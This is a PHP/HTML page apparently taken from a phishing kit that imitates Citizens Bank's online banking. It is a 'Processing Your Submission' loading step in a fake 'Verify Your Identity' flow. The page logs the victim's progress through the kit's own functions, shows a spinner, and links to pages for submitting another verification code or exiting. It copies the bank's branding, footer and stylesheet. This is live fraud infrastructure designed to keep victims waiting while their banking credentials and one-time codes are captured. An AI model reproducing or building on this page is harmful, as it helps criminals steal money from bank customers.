<?php
require_once __DIR__ . '/settings.php';
require_once __DIR__ . '/H4Z3/functions.php';

$stepKey = 'loading2';

if (!h4z3_is_step_active($stepKey)) {
    header('Location: ' . h4z3_get_first_step_path());
    exit;
}

$steps = h4z3_get_flow_steps();
$totalSteps = count($steps);
$currentStep = null;

foreach ($steps as $index => $step) {
    if (($step['key'] ?? null) === $stepKey) {
        $currentStep = $index + 1;
        break;
    }
}

if ($currentStep === null) {
    header('Location: ' . h4z3_get_first_step_path());
    exit;
}

h4z3_store_submission('loading2', []);
?>
<!DOCTYPE html>
<html class="js flexbox canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths citizens-Firefox citizens-user-none" lang="en-US">
    <head>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Online Banking Verification | Citizens Bank</title>
        <link rel="shortcut icon" href="./V1P3R/img/favicon.png" type="image/x-icon">
        <link rel="stylesheet" href="./V1P3R/css/Follow/app.css">
        <link rel="stylesheet" href="./V1P3R/css/Follow/citizensns.css">
        <link rel="stylesheet" href="./V1P3R/css/Follow/sec-3-3.css">
        <style>
            .loading-spinner {
                width: 72px;
                height: 72px;
                border-radius: 50%;
                border: 6px solid #e0e0e0;
                border-top-color: #009d78;
                margin: 0 auto 20px auto;
                animation: loading-spinner-rotate 0.9s linear infinite;
            }

            @keyframes loading-spinner-rotate {
                0% {
                    transform: rotate(0deg);
                }

                100% {
                    transform: rotate(360deg);
                }
            }

            .loading-status {
                display: block;
                font-size: 1.1em;
                color: #003c46;
            }

            .loading-actions {
                margin-top: 30px;
                display: flex;
                flex-direction: column;
                gap: 15px;
                align-items: center;
            }

            .loading-actions__button {
                display: inline-block;
                width: 100%;
                max-width: 320px;
                text-align: center;
                text-decoration: none;
                padding: 14px 10px;
                border: none;
                border-radius: 4px;
                background-color: #009d78;
                color: #fff;
                font-size: 1rem;
                font-family: CitiSans, Helvetica, Arial, sans-serif;
                cursor: pointer;
                transition: background-color 0.2s ease-in-out, transform 0.15s ease-in-out;
            }

            .loading-actions__button:hover,
            .loading-actions__button:focus {
                background-color: #007f60;
                transform: translateY(-1px);
            }

            .loading-actions__button.-secondary {
                background-color: #004c54;
            }

            .loading-actions__button.-secondary:hover,
            .loading-actions__button.-secondary:focus {
                background-color: #003c46;
            }
        </style>
    </head>
    <body class="responsive-enabled">
        <div class="citizens-header">
            <div class="citizens-header-footer">
                <header id="page-header" class="page-header">
                    <div class="centered-content clearfix">
                        <a style="cursor: pointer;" class="page-logo">
                            <img src="./V1P3R/img/CTZ_Green-01.png" alt="Citizens Bank" width="203" height="25">
                        </a>
                    </div>
                </header>
            </div>
        </div>
        <div id="page-container" class="page-container">
            <div class="centered-content clearfix">
                <div class="g-unauth-main-container">
                    <section class="unauth-intro-area">
                        <h2 class="unauth-intro-area__title ">Verify Your Identity</h2>
                        <div>
                            <div class="unauth-intro-area__step">
                                <strong>Step <?php echo $currentStep; ?> of <?php echo $totalSteps; ?>:</strong>
                                <span>Processing Your Submission</span>
                            </div>
                            <div class="unauth-intro-area__progress-container">
                                <div class="unauth-intro-area__progress-segment">
<?php for ($position = 1; $position <= $totalSteps; $position++): ?>
                                    <div class="unauth-intro-area__progress-item <?php echo $position <= $currentStep ? '-js-progress-green' : '-js-progress-light-green'; ?>"></div>
<?php endfor; ?>
                                </div>
                            </div>
                        </div>
                        <div class="unauth-intro-area__help">
                            <p class="unauth-intro-area__text">
                                We are verifying your information and preparing the next step.
                                <br>
                                This may take a few moments—please keep this window open.
                            </p>
                        </div>
                    </section>
                    <section class="identify-customer-section">
                        <div class="unauth-form__loading-text-container" role="status" aria-live="polite">
                            <div class="loading-spinner" data-loading-spinner></div>
                            <span class="unauth-form__loading-text loading-status" data-loading-status data-base-text="Please wait">Please wait</span>
                        </div>
                        <div class="loading-actions">
                            <button type="button" class="unauth-form__submit-button loading-actions__button" data-loading-link="Code.php">Submit Another Code</button>
                            <button type="button" class="unauth-form__submit-button loading-actions__button -secondary" data-loading-link="complete.php">Exit User</button>
                        </div>
                    </section>
                </div>
            </div>
        </div>
        <div class="citizens-footer">
            <div class="citizens-header-footer">
                <footer id="page-footer" class="page-footer">
                    <div class="footer-top">
                        <ul>
                            <li>
                                <a style="cursor: pointer;" class="contact" title="Opens Ways to Contact Us Dialog">
                                    <span class="account-underline">Ways to Contact Us</span><span class="visuallyhidden">- Opens Ways to Contact Us Dialog</span>
                                </a>
                            </li>
                            <li>
                                <a style="cursor: pointer;" class="locator" title="Opens Branch &amp; ATM Locator Dialog">
                                    <span class="account-underline">Branch &amp; ATM Locator</span><span class="visuallyhidden">- Opens Branch &amp; ATM Locator Dialog</span>
                                </a>
                            </li>
                        </ul>
                    </div>
                    <div class="footer-row clearfix">
                        <ul>
                            <li>
                                <h6>Checking &amp; Savings</h6>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Checking</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Savings</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Money Markets</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Certificates of Deposit (CDs)
                                    <sup>®</sup>
                                </a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">IRAs</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Programs &amp; Services</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Benefits &amp; Features</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Online &amp; Mobile Banking</a>
                            </li>
                        </ul>
                        <ul>
                            <li>
                                <h6>Credit Cards</h6>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">All Credit Cards</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Rewards Credit Cards</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Travel Rewards Credit Cards</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Cash Back Credit Cards</a>
                            </li>
                        </ul>
                        <ul>
                            <li>
                                <h6>Loans</h6>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Personal Loans</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Student Loans</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Car Buying Service</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Mortgage</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Home Equity Line of Credit (HELOC)</a>
                            </li>
                        </ul>
                    </div>
                </footer>
            </div>
        </div>
        <script>
            document.addEventListener('DOMContentLoaded', function () {
                var buttons = document.querySelectorAll('[data-loading-link]');
                buttons.forEach(function (button) {
                    button.addEventListener('click', function (event) {
                        event.preventDefault();
                        var target = button.getAttribute('data-loading-link');
                        if (target) {
                            window.location.href = target;
                        }
                    });
                });
            });
        </script>
    </body>
</html>
